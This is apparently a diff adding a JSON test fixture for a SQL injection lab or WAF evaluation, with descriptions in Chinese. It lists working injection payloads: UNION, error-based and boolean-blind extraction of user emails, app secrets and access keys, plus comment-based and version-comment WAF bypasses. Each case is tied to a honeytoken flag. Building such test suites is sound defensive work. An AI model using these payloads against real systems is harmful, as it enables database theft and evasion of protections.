@@ -1,0 +1,122 @@
+[
+  {
+    "id": "sqli-l1-users-baseline",
+    "scenario": "sqli", "level": 1, "category": "baseline",
+    "name": "UNION查users表 — 备份邮箱",
+    "payload": "-1 UNION SELECT 1, username, email, role FROM sqli_l1_users WHERE id=4",
+    "description": "UNION查询蜜标行(email=hp-3a5c7e9b@internal.local)。4列匹配",
+    "expected_flag_pattern": "hp-3a5c7e9b",
+    "applicable_transports": ["api", "direct"],
+    "http_method": "GET", "url_params": {"id": "${payload}"}
+  },
+  {
+    "id": "sqli-l1-comment-obfuscation",
+    "scenario": "sqli", "level": 1, "category": "semantic_bypass",
+    "name": "注释混淆 — users表",
+    "payload": "-1 UNION/**/SELECT/**/1,username,email,role/**/FROM/**/sqli_l1_users/**/WHERE/**/id=4",
+    "description": "/**/注释插入关键字间破坏匹配",
+    "expected_flag_pattern": "hp-3a5c7e9b",
+    "applicable_transports": ["api", "direct"],
+    "http_method": "GET", "url_params": {"id": "${payload}"}
+  },
+  {
+    "id": "sqli-l1-mysql-comment",
+    "scenario": "sqli", "level": 1, "category": "semantic_bypass",
+    "name": "MySQL版本注释 — users表",
+    "payload": "-1 /*!UNION*/ /*!SELECT*/ 1,username,email,role /*!FROM*/ sqli_l1_users /*!WHERE*/ id=4",
+    "description": "/*!...*/ MySQL版本注释绕过",
+    "expected_flag_pattern": "hp-3a5c7e9b",
+    "applicable_transports": ["api", "direct"],
+    "http_method": "GET", "url_params": {"id": "${payload}"}
+  },
+  {
+    "id": "sqli-l1-union-all",
+    "scenario": "sqli", "level": 1, "category": "semantic_bypass",
+    "name": "UNION ALL变体 — users表",
+    "payload": "-1 UNION ALL SELECT 1,username,email,role FROM sqli_l1_users WHERE id=4",
+    "description": "UNION ALL替代UNION",
+    "expected_flag_pattern": "hp-3a5c7e9b",
+    "applicable_transports": ["api", "direct"],
+    "http_method": "GET", "url_params": {"id": "${payload}"}
+  },
+  {
+    "id": "sqli-l2-products-baseline",
+    "scenario": "sqli", "level": 2, "category": "baseline",
+    "name": "字符型引号闭合 — products表",
+    "payload": "' UNION SELECT 1, name, category, price, sku FROM sqli_l2_products WHERE id=4-- -",
+    "description": "字符型UNION，查内部产品行(name=hp-5d8f2a4c)。5列匹配",
+    "expected_flag_pattern": "hp-5d8f2a4c",
+    "applicable_transports": ["api", "direct"],
+    "http_method": "GET", "url_params": {"id": "${payload}"}
+  },
+  {
+    "id": "sqli-l3-articles-baseline",
+    "scenario": "sqli", "level": 3, "category": "baseline",
+    "name": "LIKE搜索注入 — articles表",
+    "payload": "' UNION SELECT id, title, content FROM sqli_l3_articles WHERE content LIKE '%hp-9e6b1d3f%'-- -",
+    "description": "LIKE '%...%'搜索型，查内部备忘录(含hp-9e6b1d3f)。3列匹配",
+    "expected_flag_pattern": "hp-9e6b1d3f",
+    "applicable_transports": ["api", "direct"],
+    "http_method": "GET", "url_params": {"id": "${payload}"}
+  },
+  {
+    "id": "sqli-l4-config-extractvalue",
+    "scenario": "sqli", "level": 4, "category": "baseline",
+    "name": "ORDER BY报错 — app_config表",
+    "payload": "extractvalue(1,concat(0x7e,(SELECT config_value FROM app_config WHERE config_key='app.secret'),0x7e))",
+    "description": "ORDER BY子句用extractvalue报错读蜜标(hp-a1b3c5d7)",
+    "expected_flag_pattern": "hp-a1b3c5d7",
+    "applicable_transports": ["api", "direct"],
+    "http_method": "GET", "url_params": {"id": "${payload}"}
+  },
+  {
+    "id": "sqli-l5-vip-blind",
+    "scenario": "sqli", "level": 5, "category": "baseline",
+    "name": "布尔盲注 — vip表",
+    "payload": "1 AND extractvalue(1,concat(0x7e,(SELECT access_key FROM sqli_l5_vip WHERE id=1),0x7e))",
+    "description": "无回显布尔盲注extractvalue报错读access_key(hp-b9d1f3c5)",
+    "expected_flag_pattern": "hp-b9d1f3c5",
+    "applicable_transports": ["api", "direct"],
+    "http_method": "GET", "url_params": {"id": "${payload}"}
+  },
+  {
+    "id": "sqli-l1-null-bypass",
+    "scenario": "sqli", "level": 1, "category": "semantic_bypass",
+    "name": "NULL填充 — users表",
+    "payload": "-1 UNION SELECT NULL,NULL,email,NULL FROM sqli_l1_users WHERE id=4",
+    "description": "NULL填充不关心的列，减少payload特征",
+    "expected_flag_pattern": "hp-3a5c7e9b",
+    "applicable_transports": ["api", "direct"],
+    "http_method": "GET", "url_params": {"id": "${payload}"}
+  },
+  {
+    "id": "sqli-l4-config-boolean",
+    "scenario": "sqli", "level": 4, "category": "semantic_bypass",
+    "name": "ORDER BY布尔盲注 — app_config",
+    "payload": "(SELECT CASE WHEN SUBSTRING(config_value,1,1)='h' THEN score ELSE player END) FROM app_config,(SELECT @a:=0)a WHERE config_key='app.secret'",
+    "description": "ORDER BY子句CASE WHEN布尔盲注提取蜜标",
+    "expected_flag_pattern": "",
+    "applicable_transports": ["api", "direct"],
+    "http_method": "GET", "url_params": {"id": "${payload}"}
+  },
+  {
+    "id": "sqli-probe-true",
+    "scenario": "sqli", "level": 1, "category": "baseline",
+    "name": "【探针】布尔永真 1=1",
+    "payload": "${INJECTION}1=1",
+    "description": "探针模板: 验证注入语法是否被WAF拦截。${INJECTION}由生成器替换",
+    "expected_flag_pattern": "",
+    "applicable_transports": ["api", "direct"],
+    "http_method": "GET", "url_params": {"id": "${payload}"}
+  },
+  {
+    "id": "sqli-probe-false",
+    "scenario": "sqli", "level": 1, "category": "baseline",
+    "name": "【探针】布尔永真 2=2",
+    "payload": "${INJECTION}2=2",
+    "description": "探针模板B: 与1=1等价但字面不同，互验归因",
+    "expected_flag_pattern": "",
+    "applicable_transports": ["api", "direct"],
+    "http_method": "GET", "url_params": {"id": "${payload}"}
+  }
+]
